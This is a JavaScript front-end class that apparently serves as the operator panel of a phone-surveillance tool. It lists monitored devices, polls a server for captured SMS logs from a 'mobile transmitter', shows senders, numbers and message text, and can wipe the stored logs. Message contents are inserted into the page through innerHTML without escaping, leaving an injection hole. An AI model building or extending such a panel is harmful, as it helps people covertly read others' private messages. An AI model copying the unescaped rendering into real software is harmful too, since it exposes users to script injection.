class MessagesEngine {
    constructor() {
        this.activeDeviceId = localStorage.getItem('active_device_id');
        this.init();
    }

    async init() {
        await this.loadDevicesList();
        if (!this.activeDeviceId) return; 
        this.fetchMessages();
        setInterval(() => this.fetchMessages(), 12000); // Optimized 12s interval
    }

    async loadDevicesList() {
        const token = localStorage.getItem('owner_token');
        try {
            const res = await fetch('/api/devices', { headers: { 'Authorization': `Bearer ${token}` } });
            const result = await res.json();
            if (result.status === 'success') {
                const selectEl = document.getElementById('device-select');
                if (selectEl) {
                    selectEl.innerHTML = ''; 
                    if (!result.data || result.data.length === 0) {
                        selectEl.innerHTML = '<option value="">No Devices Found</option>';
                        return;
                    }
                    result.data.forEach(dev => {
                        const option = document.createElement('option');
                        option.value = dev.id;
                        option.textContent = dev.name;
                        selectEl.appendChild(option);
                    });
                    if (!this.activeDeviceId && result.data.length > 0) {
                        this.activeDeviceId = result.data[0].id;
                        localStorage.setItem('active_device_id', this.activeDeviceId);
                    }
                    selectEl.value = this.activeDeviceId;
                    selectEl.addEventListener('change', (e) => {
                        this.activeDeviceId = e.target.value;
                        localStorage.setItem('active_device_id', this.activeDeviceId);
                        this.fetchMessages(); 
                    });
                }
            }
        } catch (e) { console.error("Failed to load devices:", e); }
    }

    async fetchMessages() {
        const token = localStorage.getItem('owner_token');
        if (!this.activeDeviceId) return;
        try {
            // 🚀 FIXED: Scaled up transmission payload array registry up to top 35 logs
            const res = await fetch(`/api/messages?device_id=${this.activeDeviceId}&limit=35`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();
            if (result.status === 'success') {
                this.renderMessages(result.data || []);
            }
        } catch (e) { console.error("Messages Transmission Engine Error:", e); }
    }

    renderMessages(items) {
        const container = document.getElementById('sms-list');
        if (!container) return;

        if (items.length === 0) {
            container.innerHTML = '<div style="color: #888; text-align: center; padding: 40px;">No communication logs captured. Awaiting mobile transmitter sync...</div>';
            return;
        }

        container.innerHTML = items.map(m => {
            let directionText = 'RECEIVED';
            let directionClass = 'direction-received';

            if (m.message_type === '2' || String(m.message_type).toLowerCase() === 'sent') {
                directionText = 'SENT';
                directionClass = 'direction-sent';
            }

            const isSaved = m.contact_name && m.contact_name !== 'Unknown' && m.contact_name.trim() !== '';
            const senderIdentity = isSaved ? m.contact_name : 'Unknown Number';

            // 🚀 FIXED: Dynamic Text vs MMS Multimedia Injection Logic
            let messageBodyHtml = `<p class="sms-body-content">${m.message || m.body || '[Empty Message Context]'}</p>`;
            
            // Check if backend routed a media/image URL layout structure
            if (m.media_url || (m.message && (m.message.includes('.jpg') || m.message.includes('.png') || m.message.includes('image:')))) {
                messageBodyHtml += `
                <div class="sms-media-attachment">
                    <i data-lucide="image" style="width: 14px; height: 14px;"></i>
                    <span>Multimedia Attachment: [IMAGE FILE LOADED]</span>
                </div>
                `;
            }

            const dateObj = new Date(m.timestamp);
            const dateStr = dateObj.toLocaleDateString('en-IN', { day: '2-digit', month: 'short', year: 'numeric' });
            const timeStr = dateObj.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true });

            return `
            <div class="sms-card">
                <div class="sms-meta-header">
                    <div class="sms-sender-info">
                        <span class="sms-sender-name">${senderIdentity}</span>
                        <span class="sms-sender-phone">${m.sender || m.address || 'Hidden Origin'}</span>
                    </div>
                    <span class="sms-direction-badge ${directionClass}">${directionText}</span>
                </div>
                
                ${messageBodyHtml}
                
                <div class="sms-timestamp-footer">
                    ${dateStr} • ${timeStr}
                </div>
            </div>
            `;
        }).join('');
        
        if (window.lucide) window.lucide.createIcons();
    }
}

window.wipeSMSHistory = async function() {
    if(!confirm("WARNING: Force flush all 35 active text logs?")) return;
    const token = localStorage.getItem('owner_token');
    const activeId = localStorage.getItem('active_device_id');
    try {
        const res = await fetch('/api/messages/clear', {
            method: 'POST',
            headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ device_id: activeId })
        });
        const result = await res.json();
        if (result.status === 'success') {
            alert("SMS logs wiped cleanly.");
            window.location.reload();
        }
    } catch (e) { console.error(e); }
};

document.addEventListener('DOMContentLoaded', () => new MessagesEngine());
